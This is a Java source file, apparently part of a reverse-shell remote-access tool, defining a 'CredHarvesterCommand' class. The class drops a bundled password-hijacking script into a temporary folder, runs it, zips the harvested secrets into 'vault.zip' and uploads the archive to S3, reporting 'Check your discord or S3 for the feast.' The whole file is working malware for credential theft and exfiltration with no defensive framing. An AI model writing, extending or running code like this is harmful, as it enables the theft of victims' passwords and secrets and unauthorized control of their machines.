package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.util.*;

import java.io.File;


public class CredHarvesterCommand implements Command {
    @Override
    public String executeCommand(String command) {
        StringBuilder response = new StringBuilder();
        try {

            File dir = OSUtil.createDirectoryInTmpFolder(Constants.CUSTOM_SCRIPT_DIRECTORY);

            File script = ResourceClassPathWriterUtil.writeFileFromClassToDir(Constants.PASSWORD_HIJACKER,dir);

            SystemCommand.runOsCommand(script.getAbsolutePath(),dir);

            File secrets = new File(dir.getAbsolutePath()+File.separator+"vault.zip");

            if (secrets.exists()){
                response.append(S3UploadUtil.uploadToS3(secrets)).append("\n");
            }

            response.append("Harvest complete. Check your discord or S3 for the feast...");

        }catch (Exception e){
            response.append("Exception occurred while running script: "+ Constants.PASSWORD_HIJACKER+" error: " +e.getMessage());
            e.printStackTrace();
        }



        return response.toString();
    }








}
